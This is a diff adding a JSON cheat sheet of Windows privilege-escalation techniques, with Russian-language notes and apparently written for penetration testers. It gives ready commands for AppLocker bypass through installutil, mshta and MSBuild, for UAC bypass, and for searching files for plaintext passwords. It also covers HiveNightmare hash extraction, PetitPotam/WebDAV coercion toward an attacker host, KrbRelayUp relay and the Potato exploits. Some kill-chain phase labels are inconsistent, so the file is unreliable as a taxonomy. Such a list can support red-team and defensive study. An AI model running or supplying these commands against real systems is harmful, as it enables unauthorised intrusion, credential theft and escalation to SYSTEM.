@@ -1,0 +1,152 @@
+[
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "AppLocker Enumeration",
+    "tool": "PowerShell",
+    "req": "Low Access",
+    "command": "Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)",
+    "profit": "Information about AppLocker policies",
+    "critical_note": "Поиск разрешенных путей или файлов для обхода ограничений AppLocker.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "AppLocker Bypass (InstallUtil)",
+    "tool": "installutil.exe",
+    "req": "Writable path, .NET payload",
+    "command": "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
+    "profit": "Code Execution (Bypass)",
+    "critical_note": "Использование LOLBins (Living Off The Land Binaries) для запуска произвольного кода.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "AppLocker Bypass (Mshta)",
+    "tool": "mshta.exe",
+    "req": "Writable path, .hta file",
+    "command": "mshta.exe my.hta",
+    "profit": "Code Execution (Bypass)",
+    "critical_note": "Выполнение HTML Applications (.hta) в обход политик.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "UAC Bypass",
+    "tool": "Fodhelper / wsreset / msdt",
+    "req": "Local Admin user (medium integrity)",
+    "command": "Fodhelper.exe | wsreset.exe | msdt.exe",
+    "profit": "Admin (High Integrity)",
+    "critical_note": "Повышение привилегий с уровня пользователя (в группе администраторов) до полного администратора без запроса UAC.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "Auto Enumeration",
+    "tool": "PrivescCheck / WinPEAS",
+    "req": "PowerShell execution policy bypass (optional)",
+    "command": ".\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended",
+    "profit": "Potential Escalation Paths",
+    "critical_note": "Автоматизированный поиск уязвимостей конфигурации, слабых прав доступа и сохраненных учетных данных.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "Search Sensitive Files",
+    "tool": "findstr",
+    "req": "Read access to file system",
+    "command": "findstr /si 'pass' *.txt *.xml *.docx *.ini",
+    "profit": "User Account Credentials",
+    "critical_note": "Поиск паролей в открытом виде в текстовых и конфигурационных файлах.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "Exploit HiveNightmare (CVE-2021-36934)",
+    "tool": "vssadmin",
+    "req": "Vulnerable Windows 10/11 build",
+    "command": "vssadmin list shadows",
+    "profit": "Admin (SAM/SYSTEM Access)",
+    "critical_note": "Если доступны теневые копии и права доступа к ним некорректны, можно извлечь хеши локальных пользователей.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "WebDAV Coercion",
+    "tool": "dnstool.py, petitpotam.py",
+    "req": "Network access to DC, WebClient service",
+    "command": "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip> && petitpotam.py -u '<user>' -p <pass> -d '<domain>' 'attacker@80/random.txt' <ip>",
+    "profit": "HTTP Coerce (NTLM Hash Capture/Relay)",
+    "critical_note": "Принуждение удаленного хоста к аутентификации через WebDAV для перехвата или релея NTLM.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "Kerberos Relay (LPE)",
+    "tool": "KrbRelayUp",
+    "req": "LDAP signing not enforced (often default)",
+    "command": "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
+    "profit": "Admin (LPE)",
+    "critical_note": "Локальная атака релея Kerberos для получения прав SYSTEM.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Low access (Privilege escalation)",
+    "attack_type": "Service Account Abuse (SeImpersonate)",
+    "tool": "GodPotato / PrintSpoofer / RoguePotato",
+    "req": "SeImpersonatePrivilege",
+    "command": "GodPotato.exe -cmd 'cmd /c whoami'",
+    "profit": "Admin (SYSTEM)",
+    "critical_note": "Эскалация со служебной учетной записи до SYSTEM через злоупотребление привилегией имперсонации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "VLow access (Privilege escalation)",
+    "attack_type": "AppLocker Bypass (MSBuild)",
+    "tool": "MSBuild.exe",
+    "req": "Writable path, XML payload",
+    "command": "MsBuild.exe pshell.xml",
+    "profit": "Code Execution (Bypass)",
+    "critical_note": "Запуск произвольного C# кода, встроенного в XML-файл проекта, через доверенный компонент .NET Framework.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "VLow access (Privilege escalation)",
+    "attack_type": "Exploit SMBGhost (CVE-2020-0796)",
+    "tool": "SMBGhost Exploit",
+    "req": "Vulnerable Windows 10 (v1903/1909)",
+    "command": "SMBGhost CVE-2020-0796",
+    "profit": "Admin (SYSTEM)",
+    "critical_note": "Эксплуатация уязвимости переполнения буфера в SMBv3.1.1 для локального повышения привилегий (LPE).",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "VLow access (Privilege escalation)",
+    "attack_type": "WebDAV Coercion (Trigger)",
+    "tool": "SearchConnector-ms",
+    "req": "User interaction or file execution",
+    "command": "open file <file>.searchConnector-ms",
+    "profit": "NTLM Authentication Capture",
+    "critical_note": "Файл конфигурации поиска заставляет проводник Windows аутентифицироваться на удаленном сервере злоумышленника (WebDAV).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "VLow access (Privilege escalation)",
+    "attack_type": "Kerberos Relay (Spawn Phase)",
+    "tool": "KrbRelayUp",
+    "req": "Compromised Computer Account (from Relay)",
+    "command": "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>",
+    "profit": "Admin Session (SYSTEM)",
+    "critical_note": "Второй этап атаки: использование созданной учетной записи машины для запуска процесса от имени SYSTEM через RBCD.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "VLow access (Privilege escalation)",
+    "attack_type": "Service Account Abuse (RemotePotato0)",
+    "tool": "RemotePotato0",
+    "req": "SeImpersonatePrivilege",
+    "command": "RemotePotato0.exe",
+    "profit": "Admin (SYSTEM)",
+    "critical_note": "Вариация атаки Potato, позволяющая повысить привилегии от сервисного аккаунта до SYSTEM через кросс-протокольный релей.",
+    "kill_chain_phase": "PRIVESC"
+  }
+]
